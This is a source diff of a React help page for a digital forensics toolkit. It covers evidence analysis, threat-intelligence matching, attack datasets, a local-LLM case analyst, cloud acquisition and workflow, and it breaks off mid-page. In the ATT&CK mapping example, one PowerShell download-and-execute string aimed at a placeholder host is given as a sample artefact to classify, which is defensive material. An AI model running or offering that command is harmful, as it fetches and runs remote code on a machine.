-          <ul>
-            <li>Automated artifact parsing</li>
-            <li>Timeline generation with Plaso</li>
-            <li>Memory forensics with Volatility 3</li>
-            <li>Registry analysis</li>
-            <li>Event log parsing</li>
-            <li>Browser artifact extraction</li>
-            <li>IOC detection and extraction</li>
-            <li>MITRE ATT&CK technique mapping</li>
-          </ul>
+          <section>
+            <h4>What it reads and finds</h4>
+            <ul className="hp-cols">
+              <li>Registry, event logs, $MFT, USN journal, prefetch, Amcache, SRUM</li>
+              <li>Browsers, LNK files, jump lists, scheduled tasks, BITS</li>
+              <li>Linux and macOS persistence, logs, unified log, users</li>
+              <li>Docker hosts' containers and Kubernetes nodes' pods</li>
+              <li>Memory with Volatility 3, and a memory timeline</li>
+              <li>Timelines with Plaso</li>
+              <li>Timestomping and unusual alternate data streams</li>
+              <li>IOCs, YARA, ClamAV, keywords, misplaced binaries</li>
+              <li>Stacking across hosts, ranked with its reasons</li>
+              <li>Threat intelligence matches against Pippin's indicators</li>
+              <li>Network captures through Zeek, NetFlow exports</li>
+              <li>Phones through iLEAPP and ALEAPP</li>
+            </ul>
+          </section>
 
-          <h4>Basic Usage</h4>
+          <section>
+            <h4>From the command line</h4>
+            <p>
+              Elrond takes the case ID, one or more sources and the output directory, then long options only (an
+              unambiguous prefix works: <code>--Coll</code>). Memory images are read from the source directory with
+              the disk images. Full list: <ExternalLink href={doc('CLI.md#elrond---analysis')}>CLI.md</ExternalLink>.
+            </p>
+            <div className="hp-shell">
+              <div>
+                <h5>A disk image</h5>
+                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
+  /evidence /output/CASE-001 \\
+  --Collect --Process --Analysis`}</Code>
+              </div>
+              <div>
+                <h5>Gandalf archives, with memory</h5>
+                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
+  /evidence/CASE-001/acquisitions/ /output/CASE-001 \\
+  --Gandalf --Process --Analysis --Memory`}</Code>
+              </div>
+              <div>
+                <h5>With a timeline and IOCs</h5>
+                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
+  /evidence /output/CASE-001 \\
+  --Collect --Process --Analysis \\
+  --Timeline --extractIocs`}</Code>
+              </div>
+              <div>
+                <h5>Index a finished case into SIEMs</h5>
+                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
+  /output/CASE-001 \\
+  --Index --Splunk --Elastic --Navigator`}</Code>
+              </div>
+            </div>
+            <p>
+              <code>--Timeline</code> and <code>--extractIocs</code> are the slow ones: Plaso took 105 minutes on a
+              12 GB E01, and IOC extraction added 43.
+            </p>
+          </section>
 
-          <h5>Process Evidence (Collect Mode)</h5>
-          <pre className="code-block">
-{`elrond -C -c CASE-001 -s /evidence -o /output`}
-          </pre>
-
-          <h5>Analyze Gandalf Extraction</h5>
-          <pre className="code-block">
-{`elrond -G -c CASE-001 -s /extracted_data -o /output`}
-          </pre>
-
-          <h5>With Memory Analysis</h5>
-          <pre className="code-block">
-{`elrond -C -c CASE-001 \\
-  -s /evidence \\
-  -m /memory.dmp \\
-  -o /output`}
-          </pre>
-
-          <h5>Timeline Generation</h5>
-          <pre className="code-block">
-{`elrond -C -c CASE-001 \\
-  -s /evidence \\
-  -t \\
-  --start-date 2024-01-01 \\
-  --end-date 2024-12-31 \\
-  -o /output`}
-          </pre>
-
-          <h4>Processing Modes</h4>
-          <ul>
-            <li><strong>Brisk:</strong> Optimized processing that balances speed and thoroughness</li>
-            <li><strong>Exhaustive:</strong> Enable all available options for maximum thoroughness</li>
-            <li><strong>Custom:</strong> Full control over all processing options</li>
-            <li><strong>Template:</strong> Load a saved template of custom options for quick reuse</li>
-          </ul>
-
-          <h4>Templates</h4>
-          <p>
-            Templates allow you to save your custom processing configurations for reuse across multiple jobs.
-            This is useful when you regularly process similar evidence with the same options.
-          </p>
-          <ul>
-            <li><strong>Save:</strong> On the Confirm step, click "Save as Template" to save your current configuration</li>
-            <li><strong>Load:</strong> Select "Template" mode and choose from your saved templates</li>
-            <li><strong>Delete:</strong> Click the × button next to a template to remove it</li>
-          </ul>
-          <p>
-            Templates are stored locally in your browser and persist across sessions.
-          </p>
-
-          <h4>Analysis Features</h4>
-          <ul>
-            <li>Automated forensic analysis</li>
-            <li>IOC extraction</li>
-            <li>Timeline creation with Plaso</li>
-            <li>ClamAV malware scanning</li>
-            <li>Memory analysis with Volatility</li>
-            <li>Memory timeline generation</li>
-            <li>Threat intelligence matching against Pippin's indicators</li>
-            <li>Stacking across hosts: what few hosts of the same OS have, ranked with its reasons</li>
-          </ul>
-
-          <h4>Output Destinations</h4>
-          <ul>
-            <li><strong>Splunk:</strong> Index into local Splunk instance</li>
-            <li><strong>Elastic:</strong> Index into Elasticsearch</li>
-            <li><strong>MITRE Navigator:</strong> ATT&CK framework mapping</li>
-          </ul>
+          <section>
+            <h4>Processing modes in the web app</h4>
+            <ul className="hp-cols hp-cols--2">
+              <li><strong>Brisk:</strong> processing, analysis, IOCs, user profiles and the Navigator layer</li>
+              <li><strong>Exhaustive:</strong> every option, SIEMs, memory and timelines included</li>
+              <li><strong>Custom:</strong> pick each option yourself</li>
+              <li><strong>Template:</strong> a set of custom options you saved earlier</li>
+            </ul>
+            <p>
+              On the Confirm step, Save as Template keeps the current options; Template mode lists them, with × to
+              delete one. Templates are kept in this browser, not on the server.
+            </p>
+          </section>
         </>
-      )
+      ),
     },
     pippin: {
       title: 'Pippin',
       content: (
         <>
-          <h3>Threat Intelligence</h3>
-          <p>
-            Pippin holds the indicators Elrond matches cases against and Aulë checks single values with, in the
-            ten columns of the Iran APT workbook: evidential element, threat group, procedure, technique,
-            tactic, context, references and source.
-          </p>
+          <section>
+            <h3>Threat Intelligence</h3>
+            <p>
+              Pippin holds the indicators Elrond matches cases against and Aulë checks single values with, in ten
+              columns: evidential element, threat group, procedure example, technique ID and name, tactic,
+              contextual evidence, reference URL, Navigator layer URL and source type. Most of them come from
+              MITRE ATT&amp;CK's procedures, through MITRESaw.
+            </p>
+            <Flow
+              label="Pippin imports XLSX, CSV, STIX, TAXII and watchlists, keeps them with their validity, and they are matched by Elrond, Check a value and Aulë"
+              stages={pippinStages}
+            />
+          </section>
 
-          <h4>Sources</h4>
-          <ul>
-            <li><strong>Iran APT workbook</strong> (XLSX)</li>
-            <li><strong>STIX 2.1</strong> bundles (JSON) and <strong>TAXII 2.1</strong> collections</li>
-            <li><strong>MITRESaw</strong>'s procedures CSV, or Rowanholt's own CSV</li>
-            <li>A <strong>.txt watchlist</strong>, one value per line</li>
-          </ul>
+          <section>
+            <h4>Matching a case</h4>
+            <p>
+              Tick Threat Intelligence on Elrond's page, or give Elrond <code>--threatIntel</code> and the files.
+              Each host gets <code>analysis/threat_intel_matches.jsonl</code>, and the case gets{' '}
+              <code>threat_groups.jsonl</code>: groups ranked by what matched, each with the basis for its rank
+              (atomic indicators, specific procedures, common tooling, or technique overlap only). Built-ins,
+              ordinary words and elements many groups share don't count as attribution.
+            </p>
+            <Code>{`python3 src/analysis/elrond.py CASE-001 \\
+  /evidence/CASE-001 /cases/CASE-001 \\
+  --Gandalf --Process --Analysis \\
+  --threatIntel <indicators>.xlsx <bundle>.json`}</Code>
+          </section>
 
-          <h4>Matching a case</h4>
-          <p>
-            Tick Threat Intelligence on Elrond's page, or run Elrond with <code>--threatIntel</code>. Each host
-            gets <code>analysis/threat_intel_matches.jsonl</code>, and the case gets <code>threat_groups.jsonl</code>:
-            groups ranked by what matched, each with the basis for its rank (atomic indicators, specific
-            procedures, common tooling, or technique overlap only). Built-ins, ordinary words and elements many
-            groups share don't count as attribution.
-          </p>
-          <pre className="code-block">
-{`python3 src/analysis/elrond.py CASE-001 /evidence/CASE-001 /cases/CASE-001 \
-  --Gandalf --Process --Analysis --threatIntel iran_apt.xlsx mitre_procedures.csv`}
-          </pre>
-
-          <h4>Checking one value</h4>
-          <p>
-            Paste a process name, command line, path, IP, domain or hash into Check a value: Pippin lists the
-            indicators it matches and how many groups share each one.
-          </p>
+          <section>
+            <h4>Checking one value</h4>
+            <p>
+              Paste a process name, command line, path, IP, domain or hash into Check a value: Pippin lists the
+              indicators it matches and how many groups share each one.
+            </p>
+          </section>
         </>
-      )
+      ),
     },
     mordor: {
       title: 'Mordor',
       content: (
         <>
-          <h3>Security Event Datasets</h3>
-          <p>
-            Access pre-recorded security event datasets from the OTRF Mordor project for threat research,
-            detection development, and testing.
-          </p>
+          <section>
+            <h3>Attack Datasets and Recorded Telemetry</h3>
+            <p>
+              Mordor holds attack telemetry: public datasets recorded by others, and the lab's own recordings of
+              Atomic Red Team tests run on its machines (Aragorn → Deploy). Each recording is mapped to the
+              ATT&amp;CK technique it exercises, so the Mordor page shows which logs record each technique.
+            </p>
+            <h4>Sources</h4>
+            <ul className="hp-cols">
+              <li><strong>Your lab:</strong> your own recordings, never committed</li>
+              <li><ExternalLink href="https://github.com/splunk/attack_data">Splunk attack_data</ExternalLink></li>
+              <li><ExternalLink href="https://github.com/OTRF/Security-Datasets">Security-Datasets (OTRF)</ExternalLink></li>
+              <li>EVTX-to-MITRE-Attack</li>
+              <li>macOS-ATTACK-DATASET (local only)</li>
+              <li>Microsoft GUIDE (alerts, not logs)</li>
+            </ul>
+          </section>
 
-          <h4>About Mordor</h4>
-          <p>
-            The Mordor project provides realistic adversary simulation datasets that can be used to:
-          </p>
-          <ul>
-            <li>Test and validate detection rules</li>
-            <li>Research attacker techniques</li>
-            <li>Develop analytics and hunting queries</li>
-            <li>Train security teams</li>
-            <li>Benchmark detection capabilities</li>
-          </ul>
-
-          <h4>Dataset Categories</h4>
-          <ul>
-            <li><strong>Windows:</strong> Event logs from adversary simulations</li>
-            <li><strong>Linux:</strong> System logs and audit data</li>
-            <li><strong>Network:</strong> Packet captures and flow data</li>
-            <li><strong>Cloud:</strong> Cloud platform logs (AWS, Azure, GCP)</li>
-          </ul>
-
-          <h4>Integration with Rowanholt</h4>
-          <p>Mordor datasets are automatically cloned during Docker deployment:</p>
-          <pre className="code-block">
-{`# Location: /data/mordor
-# Access via: python3 -m rowanholt.mordor.loader`}
-          </pre>
-
-          <h4>External Access</h4>
-          <p>
-            Visit the official repository:{' '}
-            <a
-              href="https://github.com/OTRF/Security-Datasets"
-              target="_blank"
-              rel="noopener noreferrer"
-              style={{ color: '#a7db6c' }}
-            >
-              https://github.com/OTRF/Security-Datasets
-            </a>
-          </p>
+          <section>
+            <h4>From the command line</h4>
+            <p>
+              Datasets download to <code>/tmp/rowanholt/mordor</code> by default. Elrond reads one as a case
+              with <code>--Mordor</code>.
+            </p>
+            <Code>{`rowanholt mordor list --technique T1059.001
+rowanholt mordor download <dataset-id>
+rowanholt mordor local
+rowanholt mordor verify <dataset-id>`}</Code>
+          </section>
         </>
-      )
+      ),
     },
     aule: {
       title: 'Aulë',
       content: (
         <>
-          <h3>Aulë - AI-Powered Analysis</h3>
-          <p>
-            Query investigation data using natural language with a privacy-focused local LLM powered by Ollama.
-            Named after Aulë (OW-leh), the smith of the Valar in Tolkien's legendarium, maker of the Dwarves.
-          </p>
+          <section>
+            <h3>Aulë, the AI Analyst</h3>
+            <p>
+              Aulë answers questions about a case from Elrond's output. It's named after Aulë (OW-leh), the smith of
+              the Valar in Tolkien's legendarium, maker of the Dwarves.
+            </p>
+            <ul className="hp-cols hp-cols--2">
+              <li><strong>With Ollama:</strong> free-text answers, summaries and suggestions from a local model. The model is given the case's rows tagged <code>[R1]</code>, <code>[R2]</code>…, and an answer lists only the rows it cites that it was actually given</li>
+              <li><strong>Without:</strong> fixed questions answered straight from the case files: hosts, techniques, persistence, logins, IOCs, suspicious commands, threat intelligence, what's rare, confirmed findings</li>
+              <li><strong>Flagging:</strong> every cited row has ⚑, to flag it as a lead or a finding as the case browser would</li>
+              <li><strong>Nothing leaves the machine:</strong> there is no hosted-model backend</li>
+            </ul>
+          </section>
 
-          <h4>Features</h4>
-          <ul>
-            <li>Natural language queries of case data</li>
-            <li>Investigation suggestions and insights</li>
-            <li>Automated case summaries</li>
-            <li>Web chat interface</li>
-            <li>Privacy-focused local processing (no cloud)</li>
-            <li>Vector database indexing for fast queries</li>
-          </ul>
+          <section>
+            <h4>Setting up the model</h4>
+            <p>
+              The default, <code>llama3.2:3b</code>, runs anywhere but misreads cases; an 8B model such as{' '}
+              <code>qwen3:8b</code> (about 5 GB) is the smallest worth relying on. Set it in <code>.env</code> as{' '}
+              <code>ROWANHOLT_MODEL_NAME</code> and restart the stack.
+            </p>
+            <Code>{`brew install ollama   # macOS; Linux: curl -fsSL https://ollama.com/install.sh | sh
+ollama pull qwen3:8b
+ollama list`}</Code>
+          </section>
 
-          <h4>Setup</h4>
-          <pre className="code-block">
-{`# Install Ollama
-curl -fsSL https://ollama.com/install.sh | sh
+          <section>
+            <h4>From the command line</h4>
+            <p>
+              The CLI indexes a case into a vector store and asks a local model over it. Run it from the repository
+              root.
+            </p>
+            <Code>{`python3 -m src.analysis.rowanholt.ai.cli index CASE-001 /cases/CASE-001
+python3 -m src.analysis.rowanholt.ai.cli query CASE-001 \\
+  "What PowerShell commands were executed?"
+python3 -m src.analysis.rowanholt.ai.cli summary CASE-001 \\
+  --format markdown -o summary.md`}</Code>
+          </section>
 
-# Download model
-ollama pull llama3
+          <section>
+            <h4>From an MCP host</h4>
+            <p>
+              <code>rowanholt mcp</code> runs Aulë's MCP server over stdio for Claude Desktop, Claude Code and the like.
+              It's read-only and a client of Rowanholt's own API, so it never reaches <code>raw/</code>. With{' '}
+              <code>--allow-writes</code> it can flag leads and add notes, recorded as Aulë's, and nothing else. Setup
+              and the tool list: <ExternalLink href={doc('AULE.md')}>AULE.md</ExternalLink>.
+            </p>
+          </section>
 
-# Verify
-ollama list`}
-          </pre>
-
-          <h4>Usage</h4>
-
-          <h5>Index Case Data</h5>
-          <pre className="code-block">
-{`rowanholt-ai index CASE-001 /output/CASE-001`}
-          </pre>
-
-          <h5>Query Cases</h5>
-          <pre className="code-block">
-{`# Ask questions
-rowanholt-ai query CASE-001 "What PowerShell commands were executed?"
-
-# Timeline queries
-rowanholt-ai query CASE-001 "Show events between 14:00 and 15:00"
-
-# IOC queries
-rowanholt-ai query CASE-001 "List all suspicious IP addresses"`}
-          </pre>
-
-          <h5>Generate Summaries</h5>
-          <pre className="code-block">
-{`rowanholt-ai summary CASE-001 --format markdown --output report.md`}
-          </pre>
-
-          <h5>Web Interface</h5>
-          <pre className="code-block">
-{`python3 -m rowanholt.ai.web_interface
-# Visit http://localhost:5687/ai/chat/CASE-001`}
-          </pre>
-
-          <h4>Example Queries</h4>
-          <ul>
-            <li>"What were the initial access vectors?"</li>
-            <li>"Show all credential access attempts"</li>
-            <li>"What persistence mechanisms were used?"</li>
-            <li>"List files created in the last hour of the incident"</li>
-            <li>"What lateral movement techniques were observed?"</li>
-          </ul>
+          <section>
+            <h4>Questions worth asking</h4>
+            <ul className="hp-cols">
+              <li>"What were the initial access vectors?"</li>
+              <li>"What persistence mechanisms were used?"</li>
+              <li>"Show all credential access attempts"</li>
+              <li>"What lateral movement was observed?"</li>
+              <li>"Which logons failed, and from where?"</li>
+              <li>"What ran from a user-writable path?"</li>
+            </ul>
+          </section>
         </>
-      )
+      ),
     },
     features: {
       title: 'Features',
       content: (
         <>
-          <h3>Advanced Features</h3>
-          <p>
-            Rowanholt includes powerful features for threat intelligence mapping, cloud forensics, and SIEM integration.
-          </p>
+          <section>
+            <h3>Working a Case Together</h3>
+            <p>
+              Browse Case on a completed job opens its cooked artefacts and analysis, read-only. Flag rows as
+              findings, keep notes, assign hosts and follow the activity feed. A row someone already flagged can't be
+              flagged twice. Download as CSV gives a table, or the rows the filter shows, as a spreadsheet.
+            </p>
+            <Flow label="A row is flagged as a lead, decided as confirmed or benign, and confirmed findings go into the report and Navigator layer" stages={findingStages} />
+          </section>
 
-          <h4>MITRE ATT&CK Integration</h4>
-          <p>
-            Automatic mapping of forensic findings to MITRE ATT&CK techniques provides tactical context
-            and helps understand attacker methodologies.
-          </p>
-          <ul>
-            <li>Auto-updates from MITRE ATT&CK framework</li>
-            <li>Technique mapping for forensic artifacts</li>
-            <li>ATT&CK matrix dashboard generation</li>
-            <li>Coverage analysis and reporting</li>
-            <li>Navigator layer export</li>
-          </ul>
+          <section>
+            <h4>Case report</h4>
+            <p>
+              Report (DOCX) and Report (Markdown) in the case browser download the case report: the case notes and
+              confirmed findings first, each with its row and whether the row is unchanged since it was flagged; then
+              the open leads and dismissed rows; then Elrond's own report of the case. That part covers the hosts
+              and the timespan of their records, every ATT&amp;CK technique with the rows behind it, the indicators,
+              Gandalf's integrity check and the method: Elrond's options and the versions of its tools. Every claim
+              is cited by host, file, row and the row's hash. The first download of a large case reads all its tables
+              and takes a few minutes; the second format is quick. Elrond's <code>--Report</code> writes the same
+              report from the case alone into the case folder.
+            </p>
+            <Code>{`cd src/analysis
+python3 -m rowanholt.report /cases/CASE-001 --out ~/reports`}</Code>
+          </section>
 
-          <h5>MITRE Usage</h5>
-          <pre className="code-block">
-{`# Update MITRE Data
-python3 -m rowanholt.mitre.updater
+          <section>
+            <h4>MITRE ATT&amp;CK</h4>
+            <p>
+              Elrond tags each row with the techniques it shows and writes them to the case's{' '}
+              <code>mitre_techniques.txt</code>; <code>--Navigator</code> builds the case's Navigator layer. The
+              ATT&amp;CK tools work on their own as well:
+            </p>
+            <ul className="hp-cols">
+              <li>Download and refresh ATT&amp;CK data</li>
+              <li>Map one artefact to techniques</li>
+              <li>Look up a technique</li>
+              <li>Track coverage for a case</li>
+              <li>Coverage as an HTML dashboard</li>
+              <li>Splunk, Elastic and Navigator dashboards</li>
+            </ul>
+            <Code>{`python3 -m src.analysis.mitre.cli update
+python3 -m src.analysis.mitre.cli info T1059.001
+python3 -m src.analysis.mitre.cli map powershell_history \\
+  -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
+python3 -m src.analysis.mitre.coverage_cli dashboard \\
+  CASE-001 /cases/CASE-001 -o coverage.html`}</Code>
+          </section>
 
-# Map Artifacts to Techniques
-python3 -m rowanholt.mitre.mapper /path/to/artifacts
+          <section>
+            <h4>Containers</h4>
+            <p>
+              Gandalf and Elrond collect a Docker host's containers (configuration, mounts, logs, a hashed listing of
+              each writable layer and copies of the executables in it) and a Kubernetes node's static pods, pod logs
+              and audit log. Containers are tagged for what they can reach, such as the host's root or the Docker
+              socket.
+            </p>
+            <Code>{`# An audit log exported from EKS, AKS or GKE
+python3 -m src.analysis.rowanholt.cloud.cli k8s analyze-logs \\
+  -f audit.json -o ./analysis`}</Code>
+          </section>
 
-# Generate Dashboard
-python3 -m rowanholt.mitre.dashboard -o /output`}
-          </pre>
+          <section>
+            <h4>Cloud</h4>
+            <ul className="hp-cols">
+              <li><strong>AWS:</strong> EC2 snapshots, CloudTrail</li>
+              <li><strong>Azure:</strong> VM disk snapshots, Activity Log</li>
+              <li><strong>GCP:</strong> Compute Engine snapshots, Cloud Logging</li>
+            </ul>
+            <Code>{`python3 -m src.analysis.rowanholt.cloud.cli aws acquire-logs \\
+  --days 7 -o ./logs/AWS-001 --analyze
+python3 -m src.analysis.rowanholt.cloud.cli aws acquire-disk \\
+  -i i-1234567890abcdef0 -o ./snapshots/AWS-001 --wait
+python3 -m src.analysis.rowanholt.cloud.cli gcp acquire-disk \\
+  -i myinstance --zone europe-west2-a -o ./snapshots/GCP-001`}</Code>
+          </section>
 
-          <h4>Working a Case Together</h4>
-          <p>
-            Browse Case on a completed job opens its cooked artefacts and analysis, read-only. Flag rows as
-            findings (lead, confirmed or benign), keep notes, assign hosts and follow the activity feed. A row
-            someone already flagged can't be flagged twice, and a finding changed by a colleague since you
-            loaded it isn't silently overwritten. Findings and Navigator layer are built from confirmed findings
-            only. Every table is JSON Lines, each record starting with its host, artefact, source path, time (UTC)
-            and ATT&amp;CK techniques; Download as CSV gives a table, or the rows the filter shows, as a spreadsheet.
-          </p>
-
-          <h4>Case Report</h4>
-          <p>
-            Report (DOCX) and Report (Markdown) in the case browser download the case report: the case notes and
-            confirmed findings first, each with its row and whether the row is unchanged since it was flagged; then
-            the open leads and dismissed rows; then Elrond's own report of the case. That part covers the hosts
-            and the timespan of their records, every ATT&amp;CK technique with the rows behind it, the indicators,
-            Gandalf's integrity check and the method: Elrond's options and the versions of its tools. Every claim
-            is cited by host, file, row and the row's hash, so a reviewer can follow it back to the evidence. The
-            first download of a large case reads all its tables and takes a few minutes; the second format is quick.
-            Elrond's Report option writes the same report from the case alone into the case folder.
-          </p>
-          <pre className="code-block">
-{`# A case processed earlier (from src/analysis)
-python3 -m rowanholt.report /path/to/case --out ~/reports`}
-          </pre>
-
-          <h4>Container Forensics</h4>
-          <p>
-            Gandalf and Elrond collect a Docker host's containers (configuration, mounts, logs, a hashed
-            listing of each writable layer and copies of the executables in it) and a Kubernetes node's static pods, pod logs and audit log.
-            Containers are tagged for what they can reach, such as the host's root or the Docker socket.
-          </p>
-          <pre className="code-block">
-{`# Audit logs exported from EKS, AKS or GKE
-python3 -m src.analysis.rowanholt.cloud.cli k8s analyze-logs --log-file audit.json --output ./analysis`}
-          </pre>
-
-          <h4>Cloud Forensics</h4>
-          <p>
-            Acquire and analyze cloud infrastructure across AWS, Azure, and GCP.
-          </p>
-
-          <h5>Supported Providers</h5>
-          <ul>
-            <li><strong>AWS:</strong> EC2 snapshots, CloudTrail, S3, IAM</li>
-            <li><strong>Azure:</strong> VM disks, Activity Logs, Storage, AAD</li>
-            <li><strong>GCP:</strong> Compute Engine, Cloud Logging, Storage, IAM</li>
-          </ul>
-
-          <h5>Cloud Usage Examples</h5>
-          <pre className="code-block">
-{`# AWS - Acquire logs
-python3 -m rowanholt.cloud.cli aws acquire-logs --days 7 --output ./logs
-
-# Azure - Acquire disk snapshot
-python3 -m rowanholt.cloud.cli azure acquire-disk --instance-id vm-name
-
-# GCP - Create snapshot
-python3 -m rowanholt.cloud.cli gcp snapshot --instance server-name`}
-          </pre>
-
-          <h4>SIEM Integration</h4>
-          <p>Export forensic findings directly to your SIEM platform.</p>
-          <ul>
-            <li><strong>Splunk:</strong> HTTP Event Collector (HEC) integration</li>
-            <li><strong>Elasticsearch:</strong> Direct indexing with Kibana dashboards</li>
-            <li><strong>Custom:</strong> JSON/CSV export for other platforms</li>
-          </ul>
-
-          <h4>Memory Forensics</h4>
-          <p>Integrated Volatility 3 support for memory analysis.</p>
-          <ul>
-            <li>Process and DLL analysis</li>
-            <li>Network connection enumeration</li>
-            <li>Registry hive extraction</li>
-            <li>Malware detection</li>
-            <li>Memory timeline generation</li>
-          </ul>
-
-          <h4>Timeline Generation</h4>
-          <p>Plaso/log2timeline integration for comprehensive timelines.</p>
-          <ul>
-            <li>Multi-source timeline correlation</li>
-            <li>Customizable date range filtering</li>
-            <li>CSV and JSON export formats</li>
-          </ul>
+          <section>
+            <h4>SIEMs and timelines</h4>
+            <ul className="hp-cols">
+              <li><strong>Splunk:</strong> <code>--Splunk</code>, the stack's own instance</li>
+              <li><strong>Elastic:</strong> <code>--Elastic</code>, with Kibana</li>
+              <li><strong>OpenSearch and Wazuh:</strong> <code>--OpenSearch</code>, one index per case</li>
+              <li><strong>Timesketch:</strong> <code>--Timesketch</code>, a timeline per host</li>
+              <li><strong>Again later:</strong> <code>--Index</code> on a finished case</li>
+              <li><strong>Anything else:</strong> every table as JSONL, or CSV from the case browser</li>
+            </ul>
+            <p>
+              Every SIEM option fails fast if the service is unreachable. There is no separate exporter; it all runs
+              inside Elrond, or from a finished job in the web app.
+            </p>
+          </section>
         </>
-      )
+      ),
     },
     workflow: {
       title: 'Workflow',
       content: (
         <>
-          <h3>End-to-End Investigation</h3>
-          <p>
-            Follow this comprehensive workflow for a complete forensic investigation from acquisition to reporting.
-          </p>
+          <section>
+            <h3>An Investigation, End to End</h3>
+            <p>
+              From a live host to a cited report. Gandalf's archive carries its own hashes; Elrond checks them before
+              it does anything else, and every row it writes can be cited from then on: by the case browser, by Aulë
+              and in the report.
+            </p>
+            <Flow
+              label="Gandalf collects, Elrond analyses, the case browser holds findings and notes, Aulë answers questions, and the report is written"
+              stages={investigationStages}
+              caption="Disk and memory images, captures, phone backups and Mordor datasets go straight into Elrond; the rest is the same."
+            />
+          </section>
 
-          <h4>Step 1: Acquire Evidence</h4>
-          <pre className="code-block">
-{`# Remote Windows system
-python3 acquisition/python/gandalf.py Password 192.168.1.100 \\
-  -u administrator \\
-  -M \\
-  -o /evidence/CASE-001`}
-          </pre>
+          <section>
+            <h4>The same from a shell</h4>
+            <p>The web app runs each of these for you; they're here for scripts and for the record.</p>
+            <div className="hp-shell">
+              <div>
+                <h5>1. Collect</h5>
+                <Code>{`cd src/acquisition
+sudo python3 python/gandalf.py Key Local -M \\
+  -O /evidence/CASE-001/acquisitions`}</Code>
+              </div>
+              <div>
+                <h5>2. Analyse</h5>
+                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
+  /evidence/CASE-001/acquisitions/ /cases/CASE-001 \\
+  --Gandalf --Process --Analysis --Memory \\
+  --Navigator --Report`}</Code>
+              </div>
+              <div>
+                <h5>3. Ask Aulë</h5>
+                <Code>{`python3 -m src.analysis.rowanholt.ai.cli index \\
+  CASE-001 /cases/CASE-001
+python3 -m src.analysis.rowanholt.ai.cli query \\
+  CASE-001 "What was the initial access vector?"`}</Code>
+              </div>
+              <div>
+                <h5>4. Report, and the SIEMs</h5>
+                <Code>{`cd src/analysis
+python3 -m rowanholt.report /cases/CASE-001 --out ~/reports
+cd ../..
+python3 src/analysis/elrond.py CASE-001 /cases/CASE-001 \\
+  --Index --Splunk --Elastic`}</Code>
+              </div>
+            </div>
+            <p>Findings and notes are the case browser's alone: there is no command line for them.</p>
+          </section>
 
-          <h4>Step 2: Process Evidence</h4>
-          <pre className="code-block">
-{`# Analyze with Elrond
-elrond -C \\
-  -c CASE-001 \\
-  -s /evidence/CASE-001 \\
-  -m /evidence/CASE-001/memory.dmp \\
-  -o /cases/CASE-001 \\
-  --veryverbose`}
-          </pre>
-
-          <h4>Step 3: MITRE Mapping</h4>
-          <pre className="code-block">
-{`# Map findings to ATT&CK
-python3 -m rowanholt.mitre.mapper /cases/CASE-001`}
-          </pre>
-
-          <h4>Step 4: Index for AI</h4>
-          <pre className="code-block">
-{`# Index artifacts for queries
-rowanholt-ai index CASE-001 /cases/CASE-001`}
-          </pre>
-
-          <h4>Step 5: Investigate</h4>
-          <pre className="code-block">
-{`# Query with AI
-rowanholt-ai query CASE-001 "What were the initial access vectors?"
-rowanholt-ai query CASE-001 "Show persistence mechanisms"
-rowanholt-ai query CASE-001 "List lateral movement activity"`}
-          </pre>
-
-          <h4>Step 6: Generate Report</h4>
-          <pre className="code-block">
-{`# Create summary report
-rowanholt-ai summary CASE-001 --format markdown --output report.md`}
-          </pre>
-
-          <h4>Step 7: Export to SIEM</h4>
-          <pre className="code-block">
-{`# Export to Splunk
-python3 -m rowanholt.siem.splunk_exporter \\
-  --case-id CASE-001 \\
-  --data-dir /cases/CASE-001 \\
-  --hec-url https://splunk:8088 \\
-  --hec-token YOUR_TOKEN`}
-          </pre>
-
-          <h4>Best Practices</h4>
-          <ul>
-            <li><strong>Always verify hashes</strong> - Check SHA256 of acquired evidence</li>
-            <li><strong>Use encryption</strong> - Enable encryption for sensitive data</li>
-            <li><strong>Document everything</strong> - Keep detailed investigation notes</li>
-            <li><strong>Start with triage</strong> - Quick analysis to identify key artifacts</li>
-            <li><strong>Use timelines</strong> - Timeline analysis reveals attack patterns</li>
-            <li><strong>Map to MITRE</strong> - Understand attacker techniques</li>
-            <li><strong>Leverage AI</strong> - Use natural language for insights</li>
-          </ul>
+          <section>
+            <h4>Habits worth keeping</h4>
+            <ul className="hp-cols">
+              <li><strong>Key encryption:</strong> and keep the <code>.shadowfax.key</code> apart from the archive</li>
+              <li><strong>Other media:</strong> <code>-O</code> to a different disk keeps Gandalf off the host's own</li>
+              <li><strong>Check integrity:</strong> read <code>gandalf_integrity.jsonl</code> before trusting a host</li>
+              <li><strong>Triage first:</strong> leave <code>--Timeline</code> and <code>--extractIocs</code> for a second pass</li>
+              <li><strong>Leads are not verdicts:</strong> stacking rows and threat intelligence matches need an analyst</li>
+              <li><strong>Confirm before reporting:</strong> only confirmed findings lead the report and the layer</li>
+            </ul>
+          </section>
         </>
-      )
+      ),
     },
     troubleshooting: {
       title: 'Troubleshooting',
       content: (
         <>
-          <h3>Common Issues & Solutions</h3>
+          <section>
+            <h3>Common Problems</h3>
+            <div className="hp-issues">
+              <div className="hp-issue">
+                <h4>The stack won't come up</h4>
+                <p>See which container is unhappy, then read its logs.</p>
+                <Code>{`rowanholt status
+rowanholt anduril status
+rowanholt anduril logs backend -n 200`}</Code>
+              </div>
 
-          <h4>"Tool not found" Errors</h4>
-          <pre className="code-block">
-{`# Check dependencies
-elrond --check-dependencies
+              <div className="hp-issue">
+                <h4>A job seems stalled</h4>
+                <p>
+                  Foremost, Plaso, end-of-collection clean-up and the result statistics can log nothing for 30
+                  minutes or more. Check the worker is busy before cancelling.
+                </p>
+                <Code>{`rowanholt jobs status
+rowanholt anduril stats celery-worker`}</Code>
+              </div>
 
-# Install missing tools
-elrond --install
+              <div className="hp-issue">
+                <h4>A Linux image finishes in seconds with no output</h4>
+                <p>
+                  Loop devices leaked from an earlier run. List them, and release them with <code>kpartx -d</code>{' '}
+                  and <code>losetup -d</code> when nothing else is mounted.
+                </p>
+                <Code>{`losetup -a`}</Code>
+              </div>
 
-# Manual installation (Ubuntu/Debian)
-sudo apt-get install volatility3 plaso-tools`}
-          </pre>
+              <div className="hp-issue">
+                <h4>Mount permission errors</h4>
+                <p>
+                  Mounting images needs root, or the privileged worker container. Run several cases one after
+                  another, not in parallel: concurrent runs share the mount points and unmount each other's images.
+                </p>
+              </div>
 
-          <h4>Memory Analysis Failures</h4>
